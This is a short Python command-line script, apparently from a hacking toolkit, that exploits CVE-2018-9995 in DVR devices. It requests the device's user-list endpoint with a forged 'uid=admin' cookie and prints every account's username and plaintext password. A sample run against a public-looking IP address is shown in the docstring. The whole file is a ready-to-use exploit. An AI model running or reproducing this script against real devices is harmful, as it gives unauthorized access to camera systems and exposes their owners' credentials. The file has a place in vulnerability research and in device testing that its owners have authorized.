#!/usr/bin/env python3

import json
import sys

import click
import requests


@click.command()
@click.argument('ip')
@click.option('-p', 'port', default=80, help='Port to use (default: 80)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_cve_2018_9995(ip, port, verbose):
    """This command exploits the CVE-2018-9995 and its based on the original code
    from Ezequiel Fernandez (@capitan_alfa).

    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995

    Example:

    \b
    $ python habu.cve.2018-9995 82.202.102.42
    [
        {
            "uid": "admin",
            "pwd": "securepassword",
            "role": 2,
            "enmac": 0,
            "mac": "00:00:00:00:00:00",
            "playback": 4294967295,
            "view": 4294967295,
            "rview": 4294967295,
            "ptz": 4294967295,
            "backup": 4294967295,
            "opt": 4294967295
        }
    ]
    """

    url = 'http://' + ip + ':' + str(port)
    fullhost = url + '/device.rsp?opt=user&cmd=list'

    headers = {
        'Host': ip,
        'User-Agent': 'Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Languag': 'es-AR,en-US;q=0.7,en;q=0.3',
        'Connection': 'close',
        'Content-Type': 'text/html',
        'Cookie': 'uid=admin',
    }

    try:
        r = requests.get(fullhost, headers=headers,timeout=10)
    except Exception as e:
        print('Exception:', e)
        sys.exit(1)

    try:
        data = r.json()
    except Exception as e:
        print('Exception:', e)
        sys.exit(1)

    print(json.dumps(data["list"], indent=4))


if __name__ == '__main__':
    cmd_cve_2018_9995()

